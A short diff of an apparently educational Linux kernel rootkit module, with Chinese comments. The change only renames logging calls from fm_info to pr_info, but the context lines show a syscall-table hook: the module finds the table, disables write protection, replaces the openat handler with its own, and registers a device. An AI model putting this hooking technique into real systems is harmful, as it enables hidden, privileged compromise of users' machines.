@@ -13,11 +13,11 @@ static int __init rootkit_init(void)
     //错误处理
     if (!real_sys_call_table)
     {
-        fm_info("sys call table not found");
+        pr_info("sys call table not found");
         return -EFAULT;
     }
     //打印出系统调用表地址
-    fm_info("real_sys_call_table: %p", real_sys_call_table);
+    pr_info("real_sys_call_table: %p", real_sys_call_table);
 
     // 获取真实的sys_openat函数地址
     // __NR_openat是openat系统调用的系统调用号,https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl
@@ -30,7 +30,7 @@ static int __init rootkit_init(void)
     // 恢复现场，打开写保护
     enable_wp();
 
-    fm_info("update __NR_openat: %p->%p", real_sys_openat, my_sys_openat);
+    pr_info("update __NR_openat: %p->%p", real_sys_openat, my_sys_openat);
 
     // 注册设备
     major_num = register_chrdev(0, DEVICE_NAME, &rootkit_fo);
